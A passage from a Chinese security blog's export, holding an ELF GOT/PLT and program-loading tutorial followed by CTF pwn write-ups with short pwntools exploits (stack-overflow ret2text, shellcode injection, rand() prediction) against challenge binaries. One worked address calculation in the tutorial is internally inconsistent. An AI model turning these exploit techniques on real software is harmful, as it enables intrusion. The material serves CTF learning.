</span><br><span class="line">    11e2:   e8 c9 fe ff ff       call   10b0 &lt;__x86.get_pc_thunk.bx&gt;  </span><br><span class="line">    11e7:   81 c3 e9 2d 00 00    add    ebx,0x2de9  </span><br><span class="line">    11ed:   e8 bb ff ff ff       call   11ad &lt;fun&gt;  </span><br><span class="line">    11f2:   e8 69 fe ff ff       call   1060 &lt;test@plt&gt;  </span><br><span class="line">    11f7:   83 ec 0c             sub    esp,0xc  </span><br><span class="line">    11fa:   8d 83 38 e0 ff ff    lea    eax,[ebx-0x1fc8]  </span><br><span class="line">    1200:   50                   push   eax  </span><br><span class="line">    1201:   e8 4a fe ff ff       call   1050 &lt;printf@plt&gt;  </span><br><span class="line">    1206:   83 c4 10             add    esp,0x10  </span><br><span class="line">    1209:   b8 00 00 00 00       mov    eax,0x0  </span><br><span class="line">    120e:   8d 65 f8             lea    esp,[ebp-0x8]  </span><br><span class="line">    1211:   59                   pop    ecx  </span><br><span class="line">    1212:   5b                   pop    ebx  </span><br><span class="line">    1213:   5d                   pop    ebp  </span><br><span class="line">    1214:   8d 61 fc             lea    esp,[ecx-0x4]  </span><br><span class="line">    1217:   c3                   ret    </span><br></pre></td></tr></table></figure>

<h3 id="3-3-1-模块内部调用"><a href="#3-3-1-模块内部调用" class="headerlink" title="3.3.1 模块内部调用"></a>3.3.1 模块内部调用</h3><p>在 <code>main()</code> 中调用 <code>fun()</code> 的指令为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11ed:   e8 bb ff ff ff       call   11ad &lt;fun&gt;</span><br></pre></td></tr></table></figure>

<p>这是一个 x86 的 call 指令，使用了相对定位。指令的形式是 <code>e8 bb ff ff ff</code>。这是一个 5 字节的指令，其中 <code>e8</code> 是指令本身，表示 call，后面的 <code>bb ff ff ff</code> 是相对偏移量，使用补码表示的。转换为十进制表示就是 <code>-69</code>。这个值是一个相对于下一个指令地址的偏移量。<code>11f9</code> 是 call 指令的地址，所以下一个指令的地址是 <code>11f9 + 5 = 11fe</code>。然后，我们把偏移量 <code>-69</code> 加到下一个指令的地址上，这样就得到了目标地址：<code>11f9 + 5 - 69 = 11b9</code>。</p>
<p>这样做就可以使程序无论被装载到哪里都会正常执行。</p>
<h3 id="3-3-2-模块内部数据访问"><a href="#3-3-2-模块内部数据访问" class="headerlink" title="3.3.2 模块内部数据访问"></a>3.3.2 模块内部数据访问</h3><p>ELF 文件是由很多很多的 <strong>段(segment)</strong> 所组成，常见的就如 <code>.text</code> (代码段) 、<code>.data</code>(数据段，存放已经初始化的全局变量或静态变量)、<code>.bss</code> (数据段，存放未初始化全局变量)等，这样就能做到数据与指令分离互不干扰。在同一个模块中，一般前面的内存区域存放着代码后面的区域存放着数据(这里指的是 <code>.data</code> 段)。那么指令是如何访问远在 <code>.data</code> 段 中的数据呢?</p>
<p>在 <code>got.c</code> 中 <code>a</code> 是一个未初始化的全部变量，查看下在 <code>fun()</code> 中给静态全局变量 a 赋值的指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11b0:   e8 63 00 00 00       call   1218 &lt;__x86.get_pc_thunk.ax&gt;  </span><br><span class="line">11b5:   05 1b 2e 00 00       add    eax,0x2e1b  </span><br><span class="line">11ba:   c7 80 3c 00 00 00 01 mov    DWORD PTR [eax+0x3c],0x1</span><br></pre></td></tr></table></figure>

<p>从上面的指令中可以看出，它先调用了<code>__x86.get_pc_thunk.ax</code> 函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001218 &lt;__x86.get_pc_thunk.ax&gt;:  </span><br><span class="line">    1218:   8b 04 24             mov    eax,DWORD PTR [esp]  </span><br><span class="line">    121b:   c3                   ret  </span><br></pre></td></tr></table></figure>

<p>这个函数的作用就是把返回地址的值放到 eax 寄存器中，也就是把 0x11b5 保存到 eax 中，然后再加上 0x2e1b ，最后再加上 0x3c 。即 <code>0x11b5 +0x2e1b + 0x3c = 0x400c</code>，这个值就是相对于模块加载基址的值。通过这样就能访问到模块内部的数据。然后把 1 放到对应的地址从而实现赋值。</p>
<h3 id="3-3-3-模块间数据访问"><a href="#3-3-3-模块间数据访问" class="headerlink" title="3.3.3 模块间数据访问"></a>3.3.3 模块间数据访问</h3><p>全局变量 b 被定义在其他模块中，其地址需要在程序装载时才能够确定。利用到前面的代码地址无关的思想，把地址相关的部分放入数据段中，然而这里的变量 b 的地址与其自身所在的模块装载的地址有关。</p>
<p>解决：ELF 中在数据段里面建立了一个<strong>指向这些变量的指针数组</strong>，也就是我们所说的 <strong>GOT 表(Global offset Table， 全局偏移表 ）</strong>，它的功能就是当代码需要引用全局变量时，可以通过 GOT 表间接引用。</p>
<p>查看反汇编代码中是如何访问变量 b 的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">11c4:   8b 80 1c 00 00 00    mov    eax,DWORD PTR [eax+0x1c]  </span><br><span class="line">11ca:   c7 00 02 00 00 00    mov    DWORD PTR [eax],0x2</span><br></pre></td></tr></table></figure>

<p>计算变量 b 在 GOT 表中的位置： <code>0x11b5 + 0x2e1b + 0x1c = 0x3fec</code>，查看 GOT 表的位置。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -h got &gt; got.h.txt</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"> 21 .got          00000030  00003fd0  00003fd0  00002fd0  2**2  </span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>这里可以看到 <code>.got</code> 在文件中的偏移是 0x00003fd0，现在来看在动态连接时需要重定位的项，</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -R got &gt; got.got.txt</span></span><br><span class="line"></span><br><span class="line">00003fec R_386_GLOB_DAT    b@Base</span><br></pre></td></tr></table></figure>

<p>可以看到变量 b 的地址需要重定位，位于 0x00003fec，在 GOT 表中的偏移就是 28，也就是第 7 项(每四个字节为一项)，这个值正好对应之前通过指令计算出来的偏移值。</p>
<h3 id="3-3-4-模块间函数调用"><a href="#3-3-4-模块间函数调用" class="headerlink" title="3.3.4 模块间函数调用"></a>3.3.4 模块间函数调用</h3><p>模块间函数调用用到了延迟绑定，都是函数名@plt的形式，在接下来的 PLT 模块中介绍</p>
<h2 id="3-2-延迟绑定-Lazy-Binding-PLT-Procedure-Linkage-Table"><a href="#3-2-延迟绑定-Lazy-Binding-PLT-Procedure-Linkage-Table" class="headerlink" title="3.2 延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)"></a>3.2 延迟绑定(Lazy Binding) &amp;&amp; PLT(Procedure Linkage Table)</h2><p>因为 <strong>动态链接</strong> 的程序是在运行时需要对全局和静态数据访问进行 GOT 定位，然后间接寻址。同样，对于模块间的调用也需要 GOT 定位，再才间接跳转，这么做势必会影响到程序的运行速度。而且程序在运行时很大一部分函数都可能用不到，于是 ELF 采用了当函数第一次使用时才进行绑定的思想，也就是我们所说的 <strong>延迟绑定</strong>。将函数调用的绑定推迟到实际需要执行函数时才进行。在延迟绑定中，函数调用时会先检查函数的绑定状态，如果函数还没有被绑定，那么会触发一个动态绑定的过程来确定函数的实现。</p>
<p>在 ELF（Executable and Linkable Format）中，延迟绑定（Lazy Binding）通常是通过使用延迟绑定的重定位表（PLT，Procedure Linkage Table）和全局偏移表（GOT，Global Offset Table）来实现的。</p>
<p>延迟绑定在 ELF 中具体实现过程：</p>
<ol>
<li><p>在 ELF 文件的链接过程中，编译器会生成一个 PLT 和一个 GOT。PLT 是一个包含函数调用桩（stub）的表，每个桩都是一个跳转指令，用于间接调用函数。GOT 是一个全局偏移表，用于存储全局变量和函数的地址。</p>
</li>
<li><p>在程序加载时，PLT 和 GOT 会被填充。GOT 中的条目最初被设置为指向 PLT 中相应桩的地址。</p>
</li>
<li><p>当程序执行到一个延迟绑定的函数调用时，它会跳转到 PLT 中的桩。</p>
</li>
<li><p>桩的工作是在第一次调用时完成绑定。它会将控制权转移到一个专门的解析函数（通常称为解析器或链接器），该函数负责解析并绑定函数的实际地址。</p>
</li>
<li><p>解析函数通过查找符号表（Symbol Table）或其他相关信息，找到函数的实际地址，并将其写入 GOT 中相应的条目。这样，下次再次调用该函数时，就可以直接通过 GOT 中的地址进行跳转，而无需再次解析和绑定。</p>
</li>
</ol>
<p>查看之前演示代码中的 <code>.plt</code> 部分</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">objdump -Mintel -d -j .plt got &gt; ogt.plt.txt</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>-Mintel</code>：使用 Intel 格式的汇编语法来显示反汇编结果。</p>
</li>
<li><p><code>-d</code>：显示反汇编结果。</p>
</li>
<li><p><code>-j .plt</code>: 仅显示 .plt 的内容。</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001060 &lt;test@plt&gt;:  </span><br><span class="line">    1060:   ff a3 14 00 00 00    jmp    DWORD PTR [ebx+0x14]  </span><br><span class="line">    1066:   68 10 00 00 00       push   0x10  </span><br><span class="line">    106b:   e9 c0 ff ff ff       jmp    1030 &lt;_init+0x30&gt;</span><br></pre></td></tr></table></figure>

<p>查看 <code>main()</code> 函数 中调用 <code>test@plt</code> 的反汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    11e2:   e8 c9 fe ff ff       call   10b0 &lt;__x86.get_pc_thunk.bx&gt;  </span><br><span class="line">    11e7:   81 c3 e9 2d 00 00    add    ebx,0x2de9  </span><br><span class="line">    11ed:   e8 bb ff ff ff       call   11ad &lt;fun&gt;  </span><br><span class="line">    11f2:   e8 69 fe ff ff       call   1060 &lt;test@plt&gt;</span><br></pre></td></tr></table></figure>

<p>当调用 <code>test@plt</code> 时 ebx 值为 <code>0x11e7 + 0x2de9 = 0x3fd0</code>，然后 jmp 到 <code>0x3fd0 + 0x14 = 0x3fe4</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00003fe4 R_386_JUMP_SLOT   test@Base</span><br></pre></td></tr></table></figure>

<p>该地址在 .got 中，查看下具体字节</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ objdump -d -s got -j .got</span><br></pre></td></tr></table></figure>

<p>0x3fe4 处存放着 66 10 00 00，由于是小端序所以值为 0x00001066，这个值是 test 这个符号在 <code>.plt</code> 节中的下标</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001060 &lt;test@plt&gt;:  </span><br><span class="line">    1060:   ff a3 14 00 00 00    jmp    DWORD PTR [ebx+0x14]  </span><br><span class="line">    1066:   68 10 00 00 00       push   0x10  </span><br><span class="line">    106b:   e9 c0 ff ff ff       jmp    1030 &lt;_init+0x30&gt;</span><br></pre></td></tr></table></figure>

<p>这个位置刚好对应着 push 0x10 这条指令，继续 jmp 指令跳到 0x1030 处</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00001030 &lt;__libc_start_main@plt-0x10&gt;:  </span><br><span class="line">    1030:   ff b3 04 00 00 00    push   DWORD PTR [ebx+0x4]  </span><br><span class="line">    1036:   ff a3 08 00 00 00    jmp    DWORD PTR [ebx+0x8]  </span><br><span class="line">    103c:   00 00                add    BYTE PTR [eax],al  </span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><code>push DWORD PTR [ebx + 0x4]</code> 指令是将当前模块 ID 压栈，也就是 <code>got.c</code> 模块，接着 <code>jmp DWORD PTR [ebx + 0x8]</code> ，这个指令就是跳转到 <strong>动态链接器</strong> 中的 <code>_dl_runtime_resolve</code> 函数中去。这个函数的作用就是在另外的模块中查找需要的函数，就是这里的在 got_extern.so 模块中的 <code>test()</code> 函数。然后 <code>_dl_runtime_resolve</code> 函数会将 <code>test()</code> 函数的真正地址填入到 test@got 中去也就是 .got 节中。那么第二种情况就是，当第二次调用 test@plt 函数时，就会通过第一条指令跳转到真正的函数地址。整个过程就是所说的通过 <strong>plt</strong> 来实现 <strong>延迟绑定</strong> 。程序调用外部函数的整个过程就是，第一次访问 test@plt 函数时，<strong>动态链接器</strong>就会去动态共享模块中查找 test 函数的真实地址然后将真实地址保存到 test@got 中 <code>.got</code>；第二次访问 test@plt 时，就直接跳转到 test@got 中去。</p>
<h1 id="4-ELF-文件加载过程"><a href="#4-ELF-文件加载过程" class="headerlink" title="4. ELF 文件加载过程"></a>4. ELF 文件加载过程</h1><p>当我们在 Linux 的 bash 中输入命令执行某个 ELF 可执行文件时，如下所示。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">./helloworld</span></span><br></pre></td></tr></table></figure>

<p>那么，Linux 系统是如何装载该 ELF 文件并执行的呢？这个过程可以分为以下这些步骤：</p>
<ul>
<li><p>创建新进程</p>
</li>
<li><p>检查可执行文件类型</p>
</li>
<li><p>搜索匹配装载处理过程</p>
</li>
<li><p>装载执行可执行文件</p>
</li>
</ul>
<h2 id="4-1-创建新进程"><a href="#4-1-创建新进程" class="headerlink" title="4.1 创建新进程"></a>4.1 创建新进程</h2><p>首先在用户层面，bash 进程会调用 <code>fork()</code> 系统调用创建一个新的进程。其次，新的进程通过调用 <code>execve()</code> 系统调用来执行指定的 ELF 文件。原先的 bash 进程继续返回并等待刚才启动的新进程结束，之后继续等待用户输入命令。</p>
<p><code>execve()</code> 系统调用被定义在 <code>unistd.h</code>，其原型如下所示。其中的三个参数分别对应被执行程序的 <strong>程序文件名</strong>、<strong>执行参数</strong>、<strong>环境变量</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">char</span> *<span class="type">const</span> argv[], <span class="type">char</span> *<span class="type">const</span> envp[])</span>;</span><br></pre></td></tr></table></figure>

<h2 id="4-2-检查可执行文件类型"><a href="#4-2-检查可执行文件类型" class="headerlink" title="4.2 检查可执行文件类型"></a>4.2 检查可执行文件类型</h2><p>当进入 <code>execve()</code> 系统调用之后，Linux 内核就开始进行真正的装载工作。在内核中，<code>execve()</code> 系统调用相应的入口是 <code>sys_execve()</code>。<code>sys_execve()</code> 进行一些参数的检查复制之后，调用 <code>do_execve()</code>。<code>do_execve()</code> 会首先查找被执行的文件，如果找到文件，则读取文件的前 128 个字节。</p>
<p>为什么要先读取文件的前 128 个字节？这是因为 Linux 支持的可执行文件不止 ELF 一种，还包括 <strong>a.out</strong>、<strong>Java 程序</strong>、<strong>以 <code>#!</code> 开头的脚本程序</strong>。<code>do_execve()</code> 通过读取前 128 个字节来判断文件的格式。每种可执行文件格式的开头几个字节都是很特殊的，尤其是前 4 个字节，被称为 <strong>魔数（Magic Number）</strong>。比如：ELF 的可执行文件格式的头 4 个字节为 <code>0x7F</code>、<code>e</code>、<code>l</code>、<code>f</code>；Java 的可执行文件格式的头 4 个字节为 <code>c</code>、<code>a</code>、<code>f</code>、<code>e</code>；如果是解释型语言的脚本，则第一行通常是 <code>#!/bin/sh</code> 或 <code>#!/user/bin/python</code>，其中 <code>#</code> 和 <code>!</code> 构成了魔数，系统一旦判断到这两个字节，就对后面的字符串进行解析，以确定具体的解释程序的路径。</p>
<h2 id="4-3-搜索匹配装载处理过程"><a href="#4-3-搜索匹配装载处理过程" class="headerlink" title="4.3 搜索匹配装载处理过程"></a>4.3 搜索匹配装载处理过程</h2><p>当 <code>do_execve()</code> 读取了128个字节的文件头部之后，调用 <code>search_binary_handle()</code> 去搜索和匹配合适的可执行文件装载处理过程。<strong>Linux 中所有被支持的可执行文件格式都有相应的装载处理过程</strong>，<code>search_binary_handler()</code> 会通过判断头部的魔术确定文件的格式，并且调用相应的装载处理过程。常见的可执行程序及其装载处理过程的对应关系如下所示.</p>
<ul>
<li><p>ELF 可执行文件：<code>load_elf_binary()</code></p>
</li>
<li><p>a.out 可执行文件：<code>load_aout_binary()</code></p>
</li>
<li><p>可执行脚本程序：<code>load_script()</code></p>
</li>
</ul>
<h2 id="4-4-装载执行可执行文件"><a href="#4-4-装载执行可执行文件" class="headerlink" title="4.4 装载执行可执行文件"></a>4.4 装载执行可执行文件</h2><p>以 ELF 的装载处理过程 <code>load_elf_binary()</code> 为例，其所包含的步骤如下所示：</p>
<ol>
<li>操作系统读取可执行文件 ELF 的 <code>Header</code>，检查文件的有效性。</li>
<li>操作系统读取可执行文件 ELF的 <code>Program Header Table</code> 中读取每个 <code>Segment</code> 的虚拟地址、文件地址、属性等。</li>
<li>操作系统根据 <code>Program Header Table</code> 将可执行文件 ELF 映射至内存。</li>
<li>如果是静态链接的情况，则直接跳转至第 7 步；如果是动态链接的情况，操作系统将查找 <code>.interp</code> 节，找到 <strong>动态链接器（Dynamic Linker）</strong> 的位置，并启动动态链接器。在 Linux 下，动态链接器 <code>ld.so</code> 是一个共享对象，操作系统同样通过映射的方式将它加载到进程的地址空间。操作系统在加载完后，将控制权交给动态链接器的入口。</li>
<li>动态链接器获得控制权后，开始执行一系列初始化操作。</li>
<li>动态链接器根据当前的环境参数，对可执行文件进行动态链接工作。</li>
<li>控制权被转交到可执行文件的入口地址，程序开始正式执行。</li>
</ol>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><p><a href="https://ciphersaw.me/ctf-wiki/executable/elf/elf_structure/">ELF文件基本结构 - CTF Wiki</a></p>
</li>
<li><p><a href="http://chuquan.me/2018/05/21/elf-introduce/">计算机那些事(4)——ELF文件结构 | 楚权的世界</a></p>
</li>
<li><p><a href="http://chuquan.me/2018/06/17/executable-file-load-and-execution/">计算机那些事(6)——可执行文件的装载与运行 | 楚权的世界</a></p>
</li>
<li><p><a href="https://xinqiu.gitbooks.io/linux-inside-zh/content/Theory/linux-theory-2.html">ELF 文件格式 · Linux Inside 中文版</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>PWN 从入门到入土</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>HGAME 2023</title>
    <url>/posts/a642c320/</url>
    <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
<p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
</div>

<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>HGAME 2023</p>
</div>

<hr>
<h1 id="1-PWN"><a href="#1-PWN" class="headerlink" title="1. PWN"></a>1. PWN</h1><h2 id="1-1-easy-overflow"><a href="#1-1-easy-overflow" class="headerlink" title="1.1 easy_overflow"></a>1.1 easy_overflow</h2><p>例行检查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file vuln</span> </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>64 位程序，未开启随机地址以及 Canary 保护，丢到 IDA 静态分析代码</p>
<p><img src="/../../../image/20230925110348.png"></p>
<p>第 5 行将输出流关闭了，第 6 行存在缓冲区溢出</p>
<p><img src="/../../../image/20230925110413.png"></p>
<p>存在后门函数 <code>b4ckd0or()</code>，编写 exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./vuln&#x27;</span>])</span><br><span class="line">elf = ELF(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">rop = ROP(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">0x10</span> + <span class="number">0x08</span>), rop.ret.address, elf.sym[<span class="string">&#x27;b4ckd0or&#x27;</span>], <span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;exec 1&gt;&amp;0\n&#x27;</span>) <span class="comment"># 重定向输出流</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPUCTF 2022</title>
    <url>/posts/d3c21ad1/</url>
    <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
<p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
</div>

<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>SWPUCTF 2022</p>
</div>

<hr>
<h1 id="1-PWN"><a href="#1-PWN" class="headerlink" title="1. PWN"></a>1. PWN</h1><h2 id="1-1-shellcode？"><a href="#1-1-shellcode？" class="headerlink" title="1.1 shellcode？"></a>1.1 shellcode？</h2><p>检查文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ checksec --file pwn </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>丢到 IDA 静态分析代码</p>
<p><img src="/../../../image/20230925105105.png"></p>
<p>第二个 call 调用 <code>mmap(0x30303000, 0x1000, 7, 0x32, -1, 0)</code>  函数映射了一块从0x30303000 地址开始 0x1000 字节大小的可读、可写、可执行的内存块。</p>
<p>第三个 call 调用 <code>read(0, 0x30303000, 0x64)</code> 函数从输入流中读取了 0x64 字节并存入 0x30303000 开头的地址块中</p>
<p>第四个 call 将 0x30303000 内存块存储的内容作为函数调用</p>
<p>如果向 0x30303000 写入一段 shellcode 即可执行并获得 shell，编写 exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="1-2-Darling"><a href="#1-2-Darling" class="headerlink" title="1.2 Darling"></a>1.2 Darling</h2><p>检查文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file Darling</span> </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>64 位程序，保护全开，丢到 IDA 静态分析代码</p>
<p><img src="/../../../image/20230925111700.png"></p>
<p>计算随机数，编写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./Darling&#x27;</span>])</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">libc.srand(<span class="number">0x1317E53</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;for you.\n&#x27;</span>, <span class="built_in">str</span>(libc.rand() % <span class="number">100</span> - <span class="number">64</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>NUSTCTF 2022</title>
    <url>/posts/e555e042/</url>
    <content><![CDATA[<div class="note danger flat"><p>请严格遵守网络安全法相关条例！此分享主要用于交流学习，请勿用于非法用途，一切后果自付。</p>
<p>一切未经授权的网络攻击均为违法行为，互联网非法外之地。</p>
</div>

<div class="note green icon-padding flat"><i class="note-icon fas fa-rocket"></i><p>NUSTCTF 2022</p>
</div>

<hr>
<h1 id="1-PWN"><a href="#1-PWN" class="headerlink" title="1. PWN"></a>1. PWN</h1><h2 id="1-1-ezPwn"><a href="#1-1-ezPwn" class="headerlink" title="1.1 ezPwn"></a>1.1 ezPwn</h2><p>例行检查</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file pwn</span> </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>64 位程序，未开启随机地址与 canary 保护，丢到 IDA 静态分析代码</p>
<p><img src="/../../../image/20230925102424.png"></p>
<p>第 7 行存在缓冲区溢出漏洞，if 条件无法满足但是存在 system 调用，可以进行 ret2text 到 <code>system(&quot;cat flag&quot;);</code>，查看下所处的内存地址</p>
<p><img src="/../../../image/20230925104101.png"></p>
<p>获得地址 0x401229，编写 exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process([<span class="string">&#x27;./pwn&#x27;</span>])</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401229</span></span><br><span class="line"></span><br><span class="line">payload = flat([cyclic(<span class="number">0x0A</span> + <span class="number">0x08</span>), backdoor])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;plz:\n&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
